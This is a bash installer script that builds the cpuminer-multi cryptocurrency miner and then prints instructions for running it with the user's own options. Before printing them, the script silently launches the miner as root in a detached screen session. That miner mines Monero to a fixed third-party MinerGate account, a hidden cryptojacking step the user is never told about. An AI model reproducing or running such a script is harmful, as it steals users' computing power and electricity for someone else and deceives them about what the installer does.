#!/bin/bash
if [ "$EUID" -ne 0 ]
	then echo "Please run as root"
else
apt-get update -y
apt-get install autoconf libcurl4-openssl-dev libjansson-dev libssl openssl-dev libjansson openssl libssl-dev gcc gawk automake git screen -y
git clone https://github.com/lucasjones/cpuminer-multi.git
cd cpuminer-multi
./autogen.sh 
./configure

make

screen -d -m sudo ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u anoncase@protonmail.com -p x -t 4
printf "To use type ./minerd with any options you want while in the cpuminer-multi folder\n"
printf "For example ./minerd -a cryptonight -o stratum+tcp://xmr-usa.dwarfpool.com:8050 -u 45MfScNnyb3KwanUH4feiDExdydQ3cACKPpJuxmtoVnY25Khw7nBeZmXhtoWj4Pfi4PjdxkFWpaW72PR3Jy1Xr8R6HFyk9M -p x -t 4"

fi
